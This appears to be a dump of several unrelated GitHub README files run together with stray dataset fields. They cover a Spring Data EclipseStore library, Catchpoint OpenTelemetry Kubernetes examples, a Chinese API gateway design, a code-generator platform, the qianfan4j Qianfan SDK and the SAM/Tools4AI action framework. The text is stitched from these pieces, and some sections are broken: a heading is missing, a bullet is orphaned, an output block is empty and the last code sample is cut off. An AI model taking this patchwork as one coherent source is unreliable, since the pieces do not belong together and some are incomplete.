A library to simplify using [EclipseStore](https://eclipsestore.io/) in the [Spring environment](https://spring.io/projects/spring-data/).

What makes this library special is, that it creates a working copy of the data.
This way EclipseStore behaves almost exactly like relational database from a coding perspective.

## Features

The library provides following features:

* Enforces the
  **[Spring data repository concept](https://docs.spring.io/spring-data/jpa/reference/repositories/core-concepts.html)**
  for EclipseStore by
  using [working copies](https://xdev-software.github.io/spring-data-eclipse-store/working-copies.html)
* **[Drop in compatible](https://xdev-software.github.io/spring-data-eclipse-store/installation.html#drop-in-compatible)** for your existing Spring application
* Utilizes **ultra-fast EclipseStore serializing and storing**
* Enables your application to **select
  any [EclipseStore target](https://docs.eclipsestore.io/manual/storage/storage-targets/index.html)** (e.g.
  [PostgreSQL](https://docs.eclipsestore.io/manual/storage/storage-targets/sql-databases/postgresql.html),
  [AWS S3](https://docs.eclipsestore.io/manual/storage/storage-targets/blob-stores/aws-s3.html) or
  [IBM COS](https://github.com/xdev-software/eclipse-store-afs-ibm-cos))
* Can save up to **99%[^1] of monthly costs** in the IBM Cloud and up to 82%[^2] in the AWS Cloud

[^1]:If the COS Connector is used in the IBM Cloud instead of a PostgreSQL and approx. 10,000 entries with a total size
of 1
GB of data are stored. ([IBM Cloud Pricing](https://cloud.ibm.com/estimator/estimates), as of 08.01.2024)

[^2]: If the S3 connector is used instead of DynamoDB under the same conditions at
AWS. ([AWS Pricing Calculator](https://calculator.aws/#/estimate?id=ab85cddf77f0d1aa0457111ed82785dfb836b1d8), as of
08.01.2024)

catchpoint/Tracing.examples-kubernetes-java,main,"# Catchpoint Tracing Examples - Kubernetes/Java

## Pre-Requirements
1. **JDK** (`1.8+`)
2. **Maven** (`3.x`)
3. Please make sure **Docker Desktop** is installed and **Kubernetes** is activated. 
   Read [this](https://birthday.play-with-docker.com/kubernetes-docker-desktop) for details.
4. Please make sure **Kubernetes CLI** (`kubernetes-cli`/`kubectl`) is installed. 
   See [here](https://kubernetes.io/docs/tasks/tools/) for details.
   
## Setup with OpenTelemetry From the Beginning
This setup shows how you can install OpenTelemetry resources into Kubernetes first and deploy application later then.
So deployed applications will be auto instrumented.

### Setup OpenTelemetry Resources in Kubernetes
1. Replace `<CATCHPOINT-TRACING-API-KEY>` with your Catchpoint Tracing API key in `otel/collector.yaml` file.
2. Then run the setup script which installs **OpenTelemetry Operator** and **OpenTelemetry Instrumentation CR** (Custom Resource) into Kubernetes:
   ```bash
   ./otel/setup-otel.sh
   ```

### Deploy the Applications into Kubernetes with OTEL
1. Run the deployment script which deploys database and applications **with** OpenTelemetry configuration into Kubernetes:
	```bash
	./apps/deploy-apps-with-otel-conf.sh
	```
2. Wait until all services are activated.
3. Go to http://localhost:30000.

## Install OpenTelemetry After Setup

### Deploy the Applications into Kubernetes without OTEL
1. Run the deployment script which deploys database and applications **without** OpenTelemetry configuration into Kubernetes:
   ```bash
   ./apps/deploy-apps.sh
   ```
2. Wait until all services are activated.
3. Go to http://localhost:30000.

### Setup OpenTelemetry Resources in Kubernetes
1. Replace `<CATCHPOINT-TRACING-API-KEY>` with your Catchpoint Tracing API key in `otel/collector.yaml` file.
2. Then run the setup script which installs **OpenTelemetry Operator** and **OpenTelemetry Instrumentation CR** (Custom Resource) into Kubernetes:
   ```bash
   ./otel/setup-otel.sh
   ```
   
### Patch Services to be Traced by OpenTelemetry
1. Run the patch script which updates application deployments by adding **OpenTelemetry Auto Instrumentation Annotation** (`instrumentation.opentelemetry.io/inject-java`) to the services to be traced:
   ```bash
   ./apps/patch-apps-with-otel-conf.sh
   ```
2. Wait until all services are restarted.
3. Go to http://localhost:30000.

## Destroy

### Destroy the Deployment of Applications
1. Run the application destroy script which deletes applications and database deployed to Kubernetes:
   ```bash
   ./apps/destroy-apps.sh
   ```
2. Wait until all resources are deleted.

### Destroy the Resources of OpenTelemetry
1. Run the OpenTelemetry destroy script for deleting the OpenTelemetry resources (operator and instrumentation CR), 
   ```bash
   ./otel/destroy-otel.sh
   ```
2. Wait until all resources are deleted.

DIDA-lJ/BlossomGateway,main,"# 布鲁斯网关——基于 API 接口开放平台的自研微服务网关
## 为什么要开发这个项目？
之前和同学有过一个关于 API 接口开放平台的项目的开发，其中涉及到了 API 签名认证的功能，这里简单介绍一下其实现的步骤：
1. 生成密钥对：给每个用户生成唯一的密钥对（accessKey 和 secretKey），并保存到数据库中，仅用户本人可查看自己的密钥对。
2. 请求方生成签名： 请求方（客户端）使用 secretKey 对请求参数和数据进行签名，签名的内容包括请求参数、时间戳、随机数等，签名加密算法此处选择 MD5。
3. 请求方发送请求：请求方将请求参数、签名、用户标识一起发送给 API 提供者，通常会把签名等元信息放到请求头参数中传递，注意千万不要传递 secretKey。
4. API 提供者验证签名：在 API 网关中，通过请求头获取到用户标识，根据标识到数据库中查找该用户对应的 accessKey 和 secretKey，并使用相同的签名算法生成签名，和请求中的签名进行比对，如果签名一致，则 API 提供者可以信任请求方，可以进行后续操作。
   
然后这里使用 SpringCloud GateWay 作为网关，然后在网关处进行统一鉴权认证，基于这种成熟的框架开发的好处在于其支持快速整合和部署，并且由于其经过了⻓时间的市场检验，稳定性也有⼀定的保证。

但是使用了这个虽然方便，可以实现快速开发的效果，但是当你遇到问题的时候，你就只能花时间从头去了解和排查问题，这在一定程度上增加了项目的开发成本，其就像一个透明的盒子，可以帮你快速解决一些麻烦，但是如果遇到问题了，你就需要自己去打开这个盒子，去了解一些之前没有了解过的细节。

并且，其过于成熟稳定可能也就意味着其在设计的时候可能考虑了很多的东西，即可能把一些当前项目不需要的功能整合进了系统中，导致系统功能可能过于冗余，那么这个时候，在自己的需求上去一开一个适应自己需求的网关就非常重要了。



## 市场调研
1. **Spring Cloud Gateway**

-   优点：基于 Spring 框架，拥有庞大的 Spring 生态系统，可以轻松集成其他组件。支持多种协议，如WebSocket和HTTP/2。

-   缺点：相对于其他选择，性能较慢。没有像Kong那样的灵活性，其生态和社区支持较弱。

-   设计侧重点：集成多种协议和插件，扩展性。
2. **Kong**

-   优点：基于 Nginx  和 OpenResty，提供丰富的插件，管理界面较为友好。

-   缺点：⾼性能场景可能需优 化配置，插件⽣态不如 Apache/Nginx。

-   设计侧重点：扩展性和插件生态系统。
3. **Nginx**

-   优点：高性能，配置灵活，轻量级，高稳定性。

-   缺点：模块化程度较低，扩展性差，异步处理能力受限。

-   设计侧重点：⾼性能HTTP服务器和 反向代理。
   
4. **Apache HTTP Server**
-   优点：模块丰富，社区活 跃，跨平台，⽂档⻬全 。

-   缺点：性能较差，配置复杂，更重量级。

-   设计侧重点： 多功能 Web 服务器，重视模块化。
5. **HAProxy**

- 优点：高性能，支持 TCP 和 HTTP 代理，稳定且成熟。

-   缺点：配置不如 Nginx 直观，缺乏现代 Web 界面。

-   设计侧重点：专注于高并发连接的负载均衡。
6. **Traefik**

-   优点：针对容器和云环境设计，支持多种协议和场景，易于配置和部署。可以自动发现新的服务，支持自动SSL证书管理，具有良好的扩展性。

-   缺点：社区较新，历史较短，在某些高级用例下，性能可能不如其他网关。

-   设计侧重点：云原生环境中的动态配置。
   
所以，在调查了一些比较成熟且知名度比较高的网关之后，整理出了设计一个网关的侧重点：
1. **性能与可伸缩性**
- 关注高吞吐量和低延迟处理，以便于能够处理大量并发连接和数据流。
- 设计可在多个服务器、数据中⼼或地理区域之间伸缩的解决⽅案。
2. **安全性**
- 实现⾼级安全特性，如SSL/TLS终⽌、OAuth、JWT、API密钥验证和防⽌DDoS攻击等。
- 确保所有网关的流量都符合最新的安全标准和法规要求。
3. **可观测性**
- 提供详细的监控和日志记录功能，使得运维团队可以观测和诊断问题。
- 集成现有监控⼯具和警报系统的能⼒。
4. **路由能力**
- 开发动态路由和负载均衡策略，以⽀持微服务架构中服务发现的需求。
- ⽀持基于URL、路径或头部的路由决策。
5. **扩展性**
- 构建插件架构，使新功能能够以模块化的⽅式添加。
- 保持核⼼轻量级，允许通过插件或服务集成额外功能。
6. **多协议支持**
- 考虑⽀持多种⽹络协议，不仅限于HTTP/HTTPS，也包括WebSocket、RPC等。
7. **高可用性**
- 确保⽹关设计能够容忍单点故障和⽹络分区，提供故障转移和灾难恢复机制。

在列举出以上要解决的这些点以后，我们现在可以开始进行分析，即逐步解决以上这些问题：
1. **性能与可伸缩性**
- 使⽤ **Netty** 进⾏异步⽹络编程，Netty 是⼀个⾼性能的⽹络应⽤程序框架，可以处理⼤量的并发连接。
- 使用通过**缓存**：通过使用 Redis、Caffeiene 等缓存的形式来减少数据库的访问频率，从而提高性能。
- 提高异步处理能力：使用 **Disruptor** 这个高性能的异步事件处理框架，实现高效的事件发布以及消费，提高并发处理能力。
2. **安全性**
- 集成 JWT ⽤于安全的API访问。
- 利⽤ TLS/SSL 加密传输数据。
3. **可观测性**
- 集成 **Micrometer 或 Dropwizard Metrics** 来收集和导出性能指标。
- 使⽤ **ELK Stack**（Elasticsearch, Logstash, Kibana）来收集和分析⽇志数据。
- 利⽤ **Prometheus 和 Grafana** 进⾏监控和警报。
4. **路由能力**
- 利⽤ **Zuul** 或⾃定义的 **Servlet Filters** 进⾏动态路由。
- 结合 **Consul** 或 Eureka 或 Nacos 进⾏服务发现和注册。
5. **扩展性**
- 设计插件架构，使得可以通过 Java SPI (Service Provider Interface) 加载新模块。
6. **多协议支持**
- 使⽤ gRPC/Dubbo 来⽀持RPC调⽤。
- ⽀持 WebSocket ⽤于双向通信，使⽤Java的 JSR 356 或 Spring Framework 的WebSocket API。

7. **高可用性**
- 使⽤ Nacos / ZooKeeper / etcd 来管理⽹关的配置信息和服务元数据，以⽀持⾼可⽤部署。

好的，那么其实基于上⾯的分析，我们就已经可以⼤致的得到我们设计⼀个⽹关所需要的⼀些技术上的⽅向了，接下来的就是确定这些技术，并且确定⾃⼰设计该⽹关时的⼀个架构图了。


## 技术栈思考
### 性能与可伸缩性
参考⽬前主流的⽹关的设计，有SpringCloud Gateway以及Zuul，他们的底层都⼤量使⽤了异步编程的思想，并且也都有⾮常重要的⽹络通信上的设计.

且由于我们的网关采用自研的方式，其本身也是一个单独的服务，所以并不需要使用到 Spring Boot 这种框架，因此我们可以直接使用原生 Java 框架来进行编写代码。且 SpringCloud Gateway 底层也是大量使用到了 Netty，所以我们这里可以考虑一下也是用 Netty 来进行编写。

缓存以及高性能这块，我们分布式缓存直接使用 Redis 来进行实现，然后本地缓存可以使用 Caffeine，因为这两个 Redis 是市面上使用最为广泛的缓存中间件，而 Caffeine 更是有着本地缓存之王的称号，所以选择这两个框架主要是看中了其成熟的特点。

然后为了提高其缓冲区的性能，这里考虑使用 Disruptor 这个无锁队列，因为其无界队列的特性，可以将其作为缓冲区队列提升性能。
### 安全性
我们使⽤JWT，其优点在于简单的Token格式，便于跨语⾔和服务传递，适合于微服务和分布式系统的安全性设计。

当然缺点也在于我们需要精细的管理和保护我们的密钥。

这⾥并不打算⽀持TLS/SSL，因为作为个⼈开发者，想要去⽀持TLS/SSL是⽐较复杂的，并且还需要管理证书的⽣命周期，会影响项⽬开发的进度，因此并不打算在我的⽹关中⽀持TLS/SSL。


### 可观测性
- Micrometer 和 Dropwizard Metrics
  - 优点: 两者都是成熟的度量收集框架，提供了丰富的度量集合和报告功能。
  - 缺点：可能需要适配特定的监控系统或标准。
- ELK Stack
   -  优点: 提供了⼀个完整的⽇志分析解决⽅案，适⽤于⼤规模⽇志数据的收集、搜索和可视化
   -  缺点: 组件较多，搭建和维护相对复杂。
- Prometheus 和 Grafana:
   - 优点: ⾼度适合于时序数据监控，Grafana 提供强⼤的数据可视化。
   - 缺点: 需要配置和维护Prometheus数据抓取和存储。

这里我们选择使用最后一种，因为目前市面上最为流行的也是最后一种，其相对于其他两种更加简单易用一些。

### 路由能力 / 高可用
同时，在上⽂也提到了，⽹关是需要⽤到注册中⼼的，因为我们的请求具体最后要转发到那个路由，是需要从注册中⼼中拉取服务信息的，⽬前注册中⼼有：Zookeeper，Eureka，Nacos，Apollo，etcd，Consul

他们各有优劣势，⽐如Zookeeper保证的是CP⽽不是AP，我们知道，⽹关是应⽤的第⼀道⻔户，我们使⽤Dubbo的时候会使⽤Zookeeper ，但是对于⽹关，可⽤性⼤于⼀致性，因此Zookeeper我们不选。

⽽Eureka都和SpringCloud⽣态有⽐较紧密的联系，因此如果我们使⽤它，就会增加我们的⽹关和 SpringCloud 的耦合，不太符合我们⾃研的初衷，所以也不选。

Etcd虽然是通⽤的键值对分布式存储系统，可以很好的应⽤于分布式系统，但是依旧没有很好的优势，虽然他很轻量级，但是相对于 Nacos 来说，其并没有很明显的优势，这⾥暂不考虑，Consul和Etcd差不多，所以这⾥也不考虑Consul。

这⾥选⽤Nacos作为注册中⼼，Nacos⾸先⽀持CP和AP协议，并且提供了很好的控制台⽅便我对服务进⾏管理。同时，Nacos的社区相对来说⾮常活跃，⽹络上的资料也更加的多，Nacos使用范围更广，因此在这⾥选择Nacos作为注册中⼼。

当然，上⾯的⼏种注册中⼼都可以使⽤，没有特别明显的优劣势，他们也都有各⾃合适的场合，具体场合具体分析，主要是要分析⾃⼰的团队更加了解或者适合哪⼀种注册中⼼。

⽽配置中⼼⽅⾯，有SpringCloud Config，Apollo，Nacos，这⾥很明显，依旧选择Nacos，因为Nacos不仅仅是注册中⼼也是配置中⼼。因此选⽤Nacos我们可以减少引⼊不必要的第三⽅组件。

### 多协议支持
可以考虑的有gRPC和Dubbo，gRPC⽀持多种语⾔，并且基于HTTP/2.0，Dubbo在Alibaba使⽤的⽐较多，并且⽐较适合Java的⽣态。同时gRPC的使⽤要求熟悉Protobuf，所以这⾥为了减少成本，考虑使⽤Dubbo。

所以，经过分析，可以得出最终的技术栈如下：
1. 开发语言： Java （JDK 19）
2. 网络通信框架：Netty 4.1.51
3. 缓存：Redis、Caffeine 版本不限
4. 注册中心与配置中心：Dubbo 2.7.x

## 📖 项目简介

HiveGenerator 是一个分阶段开发的定制化代码生成器平台。它不仅旨在提高个人和团队的开发效率，减少重复性编码工作，而且通过社区的力量，促进代码生成器的共享和协作。项目分为三个主要阶段：

1. **本地代码生成器** 🖥️：基于命令行的脚手架工具，根据用户交互式输入快速生成特定代码。
2. **代码生成器制作工具** 🛠️：将常用项目代码快速转化为代码生成器，提升工作效率。
3. **在线代码生成器平台** 🌐：支持制作、发布、在线使用和共享代码生成器，促进协作开发。

## 🔍 解决的问题

- **提高效率** ⏱️：自动化生成重复性代码片段，解决效率低下问题。
- **定制化需求** 🎨：满足开发中的特定需求，提供定制化解决方案。
- **促进协作** 👥：线上平台支持代码生成器的共享与协作，提升团队协作效率。

## 📐 项目设计

### 🔧 代码生成器核心原理

**参数 + 模板文件 = 生成的完整代码**

比如参数：

```java
author = Enndfp
```

模板文件代码：

```java
-----------
I am ${author}
-----------
```

将参数注入到模板文件中，得到生成的完整代码：

```java
-----------
I am Enndfp
-----------
```

如果想要使用这套模板生成其他的代码，只需要改变参数的值即可，而不需要改变模板文件

---

### 🖥️ 第一阶段 - 本地代码生成器

目标：开发一个本地（离线）的代码生成器，实现一个简易的 Java ACM 模板项目的定制化生成

#### 业务流程

1）准备用于制作代码生成器的原始代码（比如 Java ACM 模板项目），用于后续生成

2）开发者基于原始代码，设置参数，编写动态模板

3）制作可交互的命令行工具，支持用户输入参数，得到代码生成器 Jar 包

4）使用者得到代码生成器 Jar 包，执行程序并输入参数，从而生成完整代码

#### 流程图

![image-20240222212102219](https://img.enndfp.cn/202402231454988.png)

#### 实现思路

1）先根据本地项目，扫描文件树，实现同样的静态代码生成

2）根据本地项目，预设部分动态参数、编写模板文件，能够传入配置对象进行生成

3）制作可交互的命令行工具，接收用户输入的参数，并动态生成代码

4）封装制作代码生成器 Jar 包文件，并简化使用命令

---

### 🛠️ 第二阶段 - 代码生成器制作工具

目标：开发一个本地的代码生成器制作工具，能够快速将一个项目制作为可以动态定制部分内容的代码生成器

#### 业务流程

1）准备用于制作代码生成器的原始代码，用于后续生成

2）开发者基于原始代码，**使用代码生成器制作工具**，来快速设置参数、生成动态模板

3）**使用代码生成器制作工具**，动态生成代码生成器 Jar 包

4）使用者得到代码生成器 Jar 包，执行程序并输入参数，从而生成完整代码

相较于第一阶段的业务流程，本阶段完成后可以直接使用代码生成器制作工具来快速将固定的项目代码改造为可以定制的动态模板，并自动生成命令行工具 Jar 包

#### 流程图

![image-20240226231813219](https://img.enndfp.cn/202402262318331.png)

![image-20240222211124687](https://img.enndfp.cn/202402231454221.png)

#### 实现思路

1）使用独立空间来存储管理要生成的原始文件、动态模板文件等

2）使用配置文件来记录要生成的参数和模板文件信息、自定义配置等**元信息**

3）代码生成器制作工具需要有多种可单独或组合使用的功能，比如从原始文件中抽取参数、动态生成命令行工具、打 Jar 包等

---

### 🌐 第三阶段 - 在线代码生成器平台

目标：开发一个在线代码生成器平台，可以理解为代码生成器的**应用市场**。所有人都能发布、使用、甚至是在线制作自己的代码生成器。

#### 业务流程

1）获取用于制作代码生成器的原始代码（手动准备或者远程拉取代码）

2）开发者基于原始代码，使用**在线代码生成器制作工具**，来快速制作代码生成器

3）开发者发布代码生成器至平台

4）使用者在平台上搜索代码生成器，支持在线使用或者下载离线 Jar 包（甚至还可以支持接口调用）

#### 流程图

![image-20240306190155663](https://img.enndfp.cn/202403061902772.png)

#### 实现思路

1）使用 Web 开发框架实现代码生成器信息的增删改查

2）将本地的配置和文件**上云**，存储到数据库、对象存储等云服务

3）通过可视化界面来操作第二阶段的代码生成器制作工具，复用阶段二的成果",0,0,1,mit,0.0

oldmanpushcart/qianfan4j,main,"# qianfan4j：千帆 Java SDK
![License](https://img.shields.io/badge/License-Apache_2.0-green.svg)
![JDK17+](https://img.shields.io/badge/JDK-17+-blue.svg)
![LLM-文心一言](https://img.shields.io/badge/LLM-%E6%96%87%E5%BF%83%E4%B8%80%E8%A8%80-blue.svg)

`qianfan4j`是一个开源的千帆大模型平台的非官方Java客户端，基于`JDK17`构建。它旨在提供一个功能丰富、易于集成和使用的Java库，以便开发者能够通过千帆API轻松实现对话、续写、向量嵌入和图像处理等功能。

    - **天气查询：** 输入地址，给出当前该地址天气；输入地址+时间，给出该地址时间段内的天气

## 二、系统要求

1. **JDK17**或更高版本

## 三、跑通测试

1. 到[百度智能云](https://cloud.baidu.com/)上注册一个账号
2. 在百度智能云上[创建一个应用](https://console.bce.baidu.com/qianfan/ais/console/applicationConsole/application)，你将会得到一个API Key和一个Secret Key
3. 声明环境变量：
   ```shell
   export QIANFAN_AK=<YOUR APP-KEY>
   export QIANFAN_SK=<YOUR SECRET-KEY>
   ```
   注意：[PluginAppTestCase](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/pluginapp/PluginAppTestCase.java)
   测试用例如果要跑通，需要在千帆大模型平台创建插件应用，开通`ocr-chat`插件。 并在配置文件中追加一行
   ```shell
   export QIANFAN_PLUGIN_APP_ID=<YOUR PLUGIN-APP ID>
   ```
4. 运行测试用例：`mvn test`

## 四、依赖使用

项目仓库托管在Maven中央仓库，你可以在`pom.xml`中添加以下依赖：
```xml
<dependency>
    <groupId>io.github.oldmanpushcart</groupId>
    <artifactId>qianfan4j</artifactId>
    <version>1.0.0</version>
</dependency>
```

### 创建客户端

```java
// 线程池
final var executor = Executors.newFixedThreadPool(10);

// 千帆客户端
final var client = QianFanClient.newBuilder()
    .ak(""***"") // API Key
    .sk(""***"") // Secret Key
    .executor(executor)
    .connectTimeout(Duration.ofSeconds(30))
    .build();
```

### 对话示例

```java
// 对话请求
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .messages(Message.ofUser(""hello!""))
    .build();

// 对话响应
final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response);
```

输出结果

```

### 函数调用示例

在`qianfan4j`中进行函数的声明将会变成一个非常简单的事情。框架自动帮你完成了函数的声明和参数的解析。这样，你就可以专注于函数的实现，而不用再去关心函数的声明和参数的解析了。

函数声明

```java
@ChatFn(name = ""echo"", description = ""echo words"", examples = {
    @ChatFn.Example(
        question = ""echo: words"",
        thoughts = ""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息"",
        arguments = """"""
            {
                ""words"": ""hello, world""
            }
            """"""
    )
})
public class EchoFunction implements ChatFunction<EchoFunction.Echo, EchoFunction.Echo> {

    @Override
    public CompletableFuture<Echo> call(Echo echo) {
        return CompletableFuture.completedFuture(new Echo(echo.words()));
    }

    public record Echo(String words) {

    }

}
```

对话触发函数调用

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .functions(new EchoFunction())
    .messages(Message.ofUser(""echo: HELLO WORLD!""))
    .build();

final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response.content());
```

### 多函数调用示例

`qianfan4j`会根据LLM的推理能力，自动拆解多函数调用的任务，然后按照拆解的任务顺序依次调用函数。这样，你就可以专注于函数的实现，而不用再去关心函数的调用顺序了。
我们假设有两个函数 [QueryScoreFunction](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/QueryScoreFunction.java)和 [ComputeAvgScoreFunction](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/ComputeAvgScoreFunction.java)，分别用于查询成绩和计算平均分。我们可以通过以下方式实现多函数调用：

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .functions(new QueryScoreFunction(), new ComputeAvgScoreFunction())
    .option(ChatOptions.IS_STREAM, true)
    .option(ChatOptions.IS_ENABLE_SEARCH, false)
    .option(ChatOptions.TEMPERATURE, 0.01f)
    .messages(Message.ofUser(""计算李四的语文和数学平均分""))
    .build();

final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response.content());
```

输出结果

在一次对话中，`qianfan4j`根据用户的需求，使用了`query_score`工具来查询李四的语文和数学成绩，分别是80分和70分， 
然后使用`compute_avg_score`工具来计算他们的语文平均分。最终，助手返回了李四的语文和数学平均分为75分。

### 文生图示例

`qianfan4j`会将文心一言返回的BASE64编码封装为`BufferedImage`类型，方便开发者进行后续的图像处理。
下面是一个简单的示例，展示了如何使用`qianfan4j`进行图像处理：

```java
final var request = GenerationImageRequest.newBuilder()
    .model(GenerationImageModel.STABLE_DIFFUSION_XL)
    .prompt(""猫"")
    .negative(""白色"")
    .option(GenerationImageOptions.NUMBERS, 2)
    .option(GenerationImageOptions.SIZE, GenerationImageRequest.Size.S_1024_1024)
    .build();

final var response = client.generationImage(request)
    .async()
    .join();
```

然后你就可以通过`response.images().get(0)`拿到生成的图片的`BufferedImage`类型进行后续操作了。

## 六、特别致谢

首先，我要向百度千帆大模型团队的同学们表达我最深切地感谢。正是他们不懈的努力和卓越的工作成果，使得我们能够如此便捷地利用千帆的API使用文心一言在内的LLM大模型进行开发。
他们为整个开发者社区树立了榜样，推动了技术的进步。

### 关于文心一言

作为个人使用者，我对文心一言这个产品怀有极高地评价。相较于OpenAi的GPT-4，虽然在某些功能上还有待完善，但文心一言在稳定性方面展现出了显著的优势。
在实际应用中，它的可靠和稳定让我倍感信赖，这也是我选择它作为开发基础的重要原因之一。

同时我也希望在多模态的时代，千帆大模型平台和文心一言不要落后。

### 缘起与动机

当我得知千帆大模型发布了SDK时，我迫不及待地想要集成到我的项目中。然而，我遗憾地发现他们的SDK当时并不支持Java。
作为一个Java开发者，我深知Java在开发者社区中的普及程度和重要性。因此，我决定自己动手，填补这一空白，为Java开发者提供一个方便、易用的文心一言客户端。

正是在这样的背景下，我发起了`qianfan4j`项目。它旨在成为文心一言的Java开发者最佳伴侣，提供简洁明了的API接口，帮助开发者快速集成和使用文心一言的功能。
通过`qianfan4j`，Java开发者可以轻松地实现对话、续写、向量嵌入和图像处理等功能，极大地提升了开发效率和用户体验。

### 展望与呼吁

展望未来，我希望`qianfan4j`能够成为Java开发者与千帆大模型平台之间的桥梁，推动千帆和文心一言在更多领域的应用和发展。
同时，我也呼吁更多的开发者加入到`qianfan4j`的开源社区中来，共同完善和优化这个项目，让它更好地服务于整个开发者社区。

# 🎬 Simple Action Model - SAM

SAM is a reference implementation of Tool4AI project  https://github.com/vishalmysore/Tools4AI
Basically showcasing how straight forward it is to build action oriented applications in 100% Java. In addition to action model
SAM can be used as an autonomous agent by utilizing action scripts which are a specialized form of these intelligent systems, designed specifically for enterprise AI 
applications. While retaining the core capabilities of autonomy and adaptability, scripts can operates within
a controlled framework, executing tasks and making decisions that align with predefined business rules and 
objectives

## Setup
Clone this project and then  

```mvn clean install```

## Action Processor
Action Processors are responsible for taking actions based on prompt. Actions can be written in Java Methods, Or could be 
HTTP rest end points , could be Shell scripts or could be loaded directly from the Swagger HTTP configurations.
Inside ```Main.java``` these 2 lines will predict the action and execute it using Gemini , you dont have to worry
about specifying the action, the action will be picked up based on Natural Language Processing semantic mapping
and will be executed. 

```
String cookPromptSingleText = ""My friends name is Vishal ,"" +
                ""I dont know what to cook for him today."";
GeminiActionProcessor processor = new GeminiActionProcessor();
String result = (String)processor.processSingleAction(cookPromptSingleText);
log.info(result);
```

This code will use OpenAI to predict the action and execute it 

```
OpenAiActionProcessor opeAIprocessor = new OpenAiActionProcessor();
Sring result = (String)opeAIprocessor.processSingleAction('My friends name is Vishal ,he lives in tornto.I want save this info locally');
System.out.println(result);

```

Create custom action by using @Predict annotation and @Action annotation. Parameters of the method can be 
anything and any number of parameters are allowed You need to make sure parameters have meaningful name. 

```
@Predict
public class SimpleAction {

    @Action(description = ""Provide persons name and then find out what does that person like"")
    public String whatFoodDoesThisPersonLike(String name) {
        if(""vishal"".equalsIgnoreCase(name))
        return ""Paneer Butter Masala"";
        else if (""vinod"".equalsIgnoreCase(name)) {
            return ""aloo kofta"";
        }else
            return ""something yummy"";
    }

}
```
or
```
@Log
@Predict
public class SearchAction  {

    @Action(description = ""Search the web for information"")
    public String googleSearch(String searchString, boolean isNews)  {
        log.info(searchString+"" : ""+isNews);
        HttpResponse<String> response = Unirest.post(""https://google.serper.dev/search"")
                .header(""X-API-KEY"", PredictionLoader.getInstance().getSerperKey())
                .header(""Content-Type"", ""application/json"")
                .body(""{\""q\"":\""""+searchString+""\""}"")
                .asString();
        String resStr = response.getBody().toString();
        return resStr;
    }




}
```

Or add actions in Shell or HTTP config files  

## Image Processing and Actions
Trigger actions based directly on images! Yes, you read that right – with the power of Java, we can now integrate function calling with image inputs.

Imagine a system so advanced that it can:

🚑 Call an ambulance immediately after detecting an image of a car accident.  
🍳 Suggest recipes the moment it sees images of vegetables.  
👮 Alert the police when it captures an image of a traffic signal violation.  
🚒 Contacts the fire department immediately if it ""sees"" fire.  


```
public class ImageActionExample {
public static void main(String[] args) throws AIProcessingException {
GeminiImageActionProcessor processor = new GeminiImageActionProcessor();
String imageDisription = processor.imageToText(args[0]);
GeminiV2ActionProcessor actionProcessor = new GeminiV2ActionProcessor();
Object obj = actionProcessor.processSingleAction(imageDisription);
String str  = actionProcessor.summarize(imageDisription+obj.toString());
System.out.println(str);
}
}
```


## Autonomous Agent (Action Script)

If you have a complete script written in English , ScriptProcessor will process the script and provide consolidated results

```
 ScriptProcessor script = new ScriptProcessor();
 ScriptResult result =  script.process(""complexTest.action"");
 String resultsString = script.summarize(result)
 log.info(resultsString)

```

Sample script is here 

``` 
can you reserve the flight for Vishal from Toronto to Bangalore for 3 Days on 7th december
If flight booking is successful, can you reserve the car for Vishal from Bangalore to Toronto for 10 Days on 17th december
if car booking is successful and flight cost are less than $1000 then book the sight seeing attraction called 5 star palace
if car booking is successful and flight cost are more than $1000 then book the sight seeing attraction called peanut palace
```

You can add Human In Loop validation , Explainablity , Multi Command Processor, Hallucination Detector , Bias Detector , Database and Tibco actions as well

## Prompt Transformer

Prompt Transformer, a core feature in the Tools4AI project, simplifies data transformation tasks. It effortlessly converts prompts into various formats like Java POJOs, JSON strings, CSV files, and XML. By enabling direct conversion of prompts into domain-specific objects, Prompt Transformer streamlines data processing tasks. It offers flexibility and ease of use for transforming data structures to meet diverse needs in modern applications.

### Convert Prompt to Simple Pojo

Lets take the first scenario where you want to conver the prompt directly into Java Bean or Pojo

```  
PromptTransformer builder = new PromptTransformer();
String promptTxt =""Sachin Tendulkar is very good cricket player, "" +
                           ""he joined the sports on 24032022, he has played 300 matches "" +
                           ""and his max score is 400"";
//Convert the prompt to Pojo
Player player = (Player)builder.transformIntoPojo(promptTxt, Player.class.getName(),""Player"",""create player pojo"");
log.info(player.toString());
```

The above will convert the prompt into this simple Pojo 
```
import lombok.*;
import lombok.extern.java.Log;

import java.util.Date;

@NoArgsConstructor
@AllArgsConstructor
@Getter
@Setter
@EqualsAndHashCode
@ToString
public class Player {
     int matches;
     int maxScore;
     String firstName;
     String lastName;
     Date dateJoined;


}
 
```
### Convert Prompt to Complex Pojo

The transformer can also convert into complex Pojo ( where there are multiple objects inside the Pojo)

```
PromptTransformer builder = new PromptTransformer();
promptTxt = ""can you book Maharaja restaurant in "" +
            ""Toronto for 4 people on 12th may , I am Vishal "";
//Convert the prompt to Complex Pojo
RestaurantPojo pojo = (RestaurantPojo)builder.transformIntoPojo(promptTxt, RestaurantPojo.class.getName(),""RestaurantPojo"",""Build the pojo for restaurant"");
log.info(pojo.toString()); 
```

This will create the Pojo Object of RestaurantPojo and also populate the internal objects ( not just primitive)
```
public class RestaurantPojo {
    String name;
    int numberOfPeople;
    //Pojo inside Pojo    
    RestaurantDetails restaurantDetails;
    boolean cancel;
    String reserveDate; 
```
### Convert Prompt with Custom GSON

If you expect some custom objects like Date etc in the prompt you can have custom Gson Builder

```
//Using Custom GSON to convert special values
GsonBuilder gsonBuilder = new GsonBuilder();
gsonBuilder.registerTypeAdapter(Date.class, new DateDeserializer(""dd MMMM yyyy""));
Gson gson = gsonBuilder.create();
PromptTransformer customBuilder = new PromptTransformer(gson);
